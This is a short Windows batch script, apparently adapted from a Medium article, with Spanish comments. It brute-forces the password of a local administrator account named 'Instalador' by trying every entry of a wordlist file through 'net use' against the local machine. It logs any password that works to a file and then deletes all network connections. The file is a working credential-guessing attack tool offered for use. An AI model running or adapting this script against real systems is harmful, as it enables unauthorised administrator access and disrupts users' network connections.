@echo off
rem *****************************************************************************************************
rem *	Edited from:											
rem *	https://medium.com/@markmotig/brute-forcing-local-accounts-on-an-ad-joined-computer-30c4a45af027
rem *****************************************************************************************************

rem // necesitaria obtener el idioma del sistema para reemplazar administrators/administradores
rem for /F "usebackq tokens=*" %%A in (`net localgroup administradores`) do echo hola %%A
rem // y aqui supongo que necesito una expresion regular para obtener solo la lista de administradores y tomar 1
set adminTarget=Instalador

for /F "usebackq tokens=*" %%A in ("claves.txt") do (
rem // la lista de claves no viene incluida obviamente
  call net use \\127.0.0.1 %%A /user:%computername%\%adminTarget% && (
	  @echo on
		echo Found Password %%A  >> WIN.txt
		net use * /del /y
    rem // esto borra todas las conexiones a otros host de la red
		pause
		call Win.txt
		exit
		@echo off
	)
)
